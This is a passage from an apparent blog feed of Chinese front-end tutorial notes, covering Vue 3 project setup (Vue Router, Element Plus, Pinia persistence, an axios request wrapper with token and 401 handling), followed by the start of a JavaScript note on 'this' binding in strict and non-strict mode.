class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@/assets/main.scss&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>安装 sass 依赖</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm add sass -D</span></span><br></pre></td></tr></table></figure><h1 id="VueRouter4-路由代码解析"><a href="#VueRouter4-路由代码解析" class="headerlink" title="VueRouter4 路由代码解析"></a>VueRouter4 路由代码解析</h1><ol><li>创建路由实例由 createRouter 实现</li><li>路由模式：<ol><li>history 模式使用：<code>createWebHistory()</code> ， <code>http://xxx/user</code></li><li>hash 模式使用：<code>createWebHashHistory()</code>， <code>http://xxx/#/user</code></li><li>参数是基础路径，默认<code>/</code></li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">    <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">env</span>.<span class="property">BASE_URL</span>),</span><br><span class="line">    <span class="attr">routes</span>: []</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p><code>import.meta.env.BASE_URL</code> 是Vite 环境变量：<a href="https://cn.vitejs.dev/guide/env-and-mode.html">https://cn.vitejs.dev/guide/env-and-mode.html</a></p><p>vite.config.js 中的 base 配置项：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [<span class="title function_">vue</span>()],</span><br><span class="line">    <span class="attr">base</span>: <span class="string">&#x27;/jd&#x27;</span>, <span class="comment">// 自定义base地址，http://xxx/jd/user</span></span><br><span class="line">    <span class="attr">resolve</span>: &#123;</span><br><span class="line">        <span class="attr">alias</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;@&#x27;</span>: <span class="title function_">fileURLToPath</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;./src&#x27;</span>, <span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="引入-element-ui-组件库"><a href="#引入-element-ui-组件库" class="headerlink" title="引入 element-ui 组件库"></a>引入 element-ui 组件库</h1><p><strong>官方文档：</strong> <a href="https://element-plus.org/zh-CN/">https://element-plus.org/zh-CN/</a></p><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择一个你喜欢的包管理器</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">NPM</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">npm install element-plus --save</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Yarn</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yarn add element-plus</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pnpm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm install element-plus</span></span><br></pre></td></tr></table></figure><p><strong>自动按需：</strong></p><ol><li>安装插件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm add -D unplugin-vue-components unplugin-auto-import</span></span><br></pre></td></tr></table></figure><ol start="2"><li>然后把下列代码插入到你的 <code>Vite</code> 或 <code>Webpack</code> 的配置文件中</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AutoImport</span> <span class="keyword">from</span> <span class="string">&#x27;unplugin-auto-import/vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Components</span> <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ElementPlusResolver</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/resolvers&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://vitejs.dev/config/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        ...</span><br><span class="line">        <span class="title class_">AutoImport</span>(&#123;</span><br><span class="line">            <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()]</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="title class_">Components</span>(&#123;</span><br><span class="line">            <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()]</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>直接使用，默认 components 文件夹下的文件也会被自动注册</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span>&gt;</span>Primary<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span>&gt;</span>Success<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span>&gt;</span>Info<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;warning&quot;</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span>&gt;</span>Danger<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">test-view</span>&gt;</span>我是自定义的components组件<span class="tag">&lt;/<span class="name">test-view</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230710225018162.png" alt="image-20230710225018162.png"></p><h1 id="Pinia-构建用户仓库和持久化"><a href="#Pinia-构建用户仓库和持久化" class="headerlink" title="Pinia-构建用户仓库和持久化"></a>Pinia-构建用户仓库和持久化</h1><p><strong>官方文档：</strong> <a href="https://prazdevs.github.io/pinia-plugin-persistedstate/zh/">https://prazdevs.github.io/pinia-plugin-persistedstate/zh/</a></p><ol><li>安装插件 pinia-plugin-persistedstate</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm add pinia-plugin-persistedstate -D</span></span><br></pre></td></tr></table></figure><ol start="2"><li>使用 main.js</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> persist <span class="keyword">from</span> <span class="string">&#x27;pinia-plugin-persistedstate&#x27;</span></span><br><span class="line">...</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">createPinia</span>().<span class="title function_">use</span>(persist))</span><br></pre></td></tr></table></figure><ol start="3"><li>配置 store&#x2F;user.js</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useUserStore = <span class="title function_">defineStore</span>(</span><br><span class="line">    <span class="string">&#x27;big-user&#x27;</span>,</span><br><span class="line">    <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> token = <span class="title function_">ref</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">setToken</span> = (<span class="params">newToken</span>) =&gt; &#123;</span><br><span class="line">            token.<span class="property">value</span> = newToken</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">removeToken</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">            token.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            token,</span><br><span class="line">            setToken,</span><br><span class="line">            removeToken</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">persist</span>: <span class="literal">true</span> <span class="comment">// 配置持久化</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="Pinia-配置仓库统一管理"><a href="#Pinia-配置仓库统一管理" class="headerlink" title="Pinia-配置仓库统一管理"></a>Pinia-配置仓库统一管理</h1><p>pinia 独立维护</p><ul><li>现在：初始化代码在 main.js 中，仓库代码在 stores 中，代码分散职能不单一</li><li>优化：由 stores 统一维护，在 stores&#x2F;index.js 中完成 pinia 初始化，交付 main.js 使用</li></ul><p>仓库 统一导出</p><ul><li>现在：使用一个仓库 &#96;import { useUserStore } from ‘.&#x2F;stores&#x2F;user.js’ 不同仓库路径不一致</li><li>优化：由 stores&#x2F;index.js 统一导出，导入路径统一 <code>./stores</code>，而且仓库维护在 stores&#x2F;modules 中</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stores/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> persist <span class="keyword">from</span> <span class="string">&#x27;pinia-plugin-persistedstate&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> pinia = <span class="title function_">createPinia</span>()</span><br><span class="line">pinia.<span class="title function_">use</span>(persist)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> pinia</span><br><span class="line">  </span><br><span class="line"><span class="comment">// import &#123; userUserStore &#125; from &#x27;./modules/user&#x27;</span></span><br><span class="line"><span class="comment">// export &#123; userUserStore &#125;</span></span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./modules/user&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- App.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; useUserStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/stores&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> userStore = <span class="keyword">new</span> <span class="title function_">useUserStore</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是App<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; userStore.token &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;userStore.setToken(&#x27;我是Alien&#x27;)&quot;</span>&gt;</span></span><br><span class="line">        登录</span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;userStore.removeToken()&quot;</span>&gt;</span>退出<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="数据交互-请求工具设计"><a href="#数据交互-请求工具设计" class="headerlink" title="数据交互-请求工具设计"></a>数据交互-请求工具设计</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230711071913061.png" alt="image-20230711071913061.png"></p><h2 id="创建-axios-实例"><a href="#创建-axios-实例" class="headerlink" title="创建 axios 实例"></a>创建 axios 实例</h2><p>们会使用 axios 来请求后端接口，一般都会对 axios 进行一些配置（比如：配置基础地址等）</p><p>一般项目开发中，都会对 axios 进行基本的二次封装，单独封装到一个模块中，便于使用</p><ol><li>安装 axios</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm add axios</span></span><br></pre></td></tr></table></figure><ol start="2"><li>新建 <code>utils/request.js</code> 封装 axios 模块</li></ol><p>利用 axios.create 创建一个自定义的 axios 来使用</p><p><a href="http://www.axios-js.com/zh-cn/docs/#axios-create-config">http://www.axios-js.com/zh-cn/docs/#axios-create-config</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baseURL = <span class="string">&#x27;http://big-event-vue-api-t.itheima.net&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="comment">// TODO 1. 基础地址，超时时间</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 2. 携带token</span></span><br><span class="line">        <span class="keyword">return</span> config</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 3. 处理业务失败</span></span><br><span class="line">        <span class="comment">// TODO 4. 摘取核心响应数据</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 5. 处理401错误</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance</span><br></pre></td></tr></table></figure><h2 id="完成-axios-基本配置"><a href="#完成-axios-基本配置" class="headerlink" title="完成 axios 基本配置"></a>完成 axios 基本配置</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useUserStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/stores/user&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;@/router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ElMessage</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baseURL = <span class="string">&#x27;http://big-event-vue-api-t.itheima.net&#x27;</span></span><br><span class="line"><span class="comment">// 基础地址，超时时间</span></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    baseURL,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">100000</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 请求拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line">        <span class="keyword">if</span> (userStore.<span class="property">token</span>) &#123; <span class="comment">// 携带token</span></span><br><span class="line">            config.<span class="property">headers</span>.<span class="property">Authorization</span> = userStore.<span class="property">token</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> config</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">)</span><br><span class="line"><span class="comment">// 响应拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 摘取核心响应数据</span></span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">data</span>.<span class="property">code</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 处理业务失败，给错误信息，抛出错误</span></span><br><span class="line">        <span class="title class_">ElMessage</span>(&#123; <span class="attr">message</span>: res.<span class="property">data</span>.<span class="property">message</span> || <span class="string">&#x27;服务异常&#x27;</span>, <span class="attr">type</span>: <span class="string">&#x27;error&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(res.<span class="property">data</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 处理401权限不足错误</span></span><br><span class="line">        <span class="title class_">ElMessage</span>(&#123; <span class="attr">message</span>: err.<span class="property">response</span>.<span class="property">data</span>.<span class="property">message</span> || <span class="string">&#x27;服务异常&#x27;</span>, <span class="attr">type</span>: <span class="string">&#x27;error&#x27;</span> &#125;)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">        <span class="keyword">if</span> (err.<span class="property">response</span>?.<span class="property">status</span> === <span class="number">401</span>) &#123;</span><br><span class="line">            router.<span class="title function_">push</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance</span><br><span class="line"><span class="keyword">export</span> &#123; baseURL &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS 原理面试-this、继承、fetch、generator</title>
      <link href="/2024/04/07/JS%20%E5%8E%9F%E7%90%86%E9%9D%A2%E8%AF%95-this%E3%80%81%E7%BB%A7%E6%89%BF%E3%80%81fetch%E3%80%81generator/"/>
      <url>/2024/04/07/JS%20%E5%8E%9F%E7%90%86%E9%9D%A2%E8%AF%95-this%E3%80%81%E7%BB%A7%E6%89%BF%E3%80%81fetch%E3%80%81generator/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript-中的-this"><a href="#JavaScript-中的-this" class="headerlink" title="JavaScript 中的 this"></a>JavaScript 中的 this</h1><p>在绝大多数情况下，函数的调用方式决定了 this 的值（运行时绑定）。this 不能在执行期间被赋值，并且在每次函数被 调用时 this 的值也可能会不同。</p><h2 id="确定-this-的值"><a href="#确定-this-的值" class="headerlink" title="确定 this 的值"></a>确定 this 的值</h2><p>在非严格模式下，总是指向一个对象。但是在严格模式下，可以指定任意值。</p><p>开启严格模式的两种方法：</p><ol><li>在整个脚本顶部开启</li><li>在函数顶部开启</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为全局开启严格模式</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 为局部开启严格模式</span></span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以根据不同的模式来确认this指向啦，</p><ol><li>全局执行环境中，指向<strong>全局对象</strong>（非严格模式、严格模式）</li><li>函数内部,取决于函数被调用的方式<ol><li>直接调用的this值:<ol><li>非严格模式:全局对象(window)</li><li>严格模式:undefined</li></ol></li><li>对象方法调用的this值:<ol><li><strong>调用者</strong></li></ol></li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.全局执行环境</span></span><br><span class="line"><span class="comment">// 非严格模式: 不做任何设置,直接写就是非严格模式</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 严格模式: 代码顶部加上 &#x27;use strict&#x27; 即可</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span> <span class="comment">// 为整个脚本开启严格模式</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.函数内部</span></span><br><span class="line"><span class="comment">//  2.1 直接调用-非严格模式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// 全局对象window</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">func</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//  2.1 直接调用-严格模式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>) <span class="comment">// undefined</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">func</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//  2.2 对象方法调用</span></span><br><span class="line"><span class="keyword">const</span> fans = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;ikun&#x27;</span>,</span><br><span class="line">    